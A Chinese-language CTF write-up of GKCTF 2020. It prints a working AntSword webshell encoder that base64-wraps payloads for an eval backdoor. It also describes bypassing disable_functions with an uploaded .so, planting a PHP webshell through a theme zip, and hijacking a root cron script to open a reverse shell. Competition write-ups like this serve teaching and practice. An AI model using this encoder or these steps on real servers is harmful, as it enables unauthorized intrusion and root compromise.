# GKCTF 2020

## 前言

比赛当天有事，然后就没咋打，但是赛后复现发现题目出的好棒

## 0x01 Checkin

直接给了``eval``后门，但是得用base64编码，
于是手写个蚁剑编码器

```js
/**
 * php::base64编码器
 * Create at: 2020/05/24 10:13:32
 */

'use strict';

/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
module.exports = (pwd, data, ext={}) => {
  // ##########    请在下方编写你自己的代码   ###################
  // 以下代码为 PHP Base64 样例

  // 生成一个随机变量名
  let randomID = `_0x${Math.random().toString(16).substr(2)}`;
  // 原有的 payload 在 data['_']中
  // 取出来之后，转为 base64 编码并放入 randomID key 下
  data[randomID] = Buffer.from(data['_']).toString('base64');

  // shell 在接收到 payload 后，先处理 pwd 参数下的内容，
  data[pwd] = new Buffer(`eval(base64_decode($_POST[${randomID}]));die();`).toString('base64');

  // ##########    请在上方编写你自己的代码   ###################

  // 删除 _ 原有的payload
  delete data['_'];
  // 返回编码器处理后的 payload 数组
  return data;
}
```

然后就能连上了，但是``/var/html``目录下没法写其他文件

而且得绕``disabled_functions``

于是乎用蚁剑执行脚本的插件

传一个``hack.so``

就能绕过了


![](/assets/images/gkctf2020-p1.png)

## 0x02 CVE Checkin

后来放了提示是``cve-2020-7066``

但其实应该fuzz到吧....

然后就是做题的时候特意开了个靶机去监听

后来发现访问``127.0.0.1``直接有提示

傻了傻了....

## 0x03 老八小超市儿

渗透题

没去想后台地址弱密码还是经验太少了or2

然后就是看传文件点，传个shell上去

但是文件具体在哪又找了半天

如果传在默认主题zip的``default/__static__/eki.php``


那么访问路由应该是下面这样

```
/public/static/index/default/eki.php
```

getshell完了，根据提示，去找生成的脚本（因为这个脚本是由root权限+定时执行的）

改造下这个脚本，反弹shell，就拿到root权限了



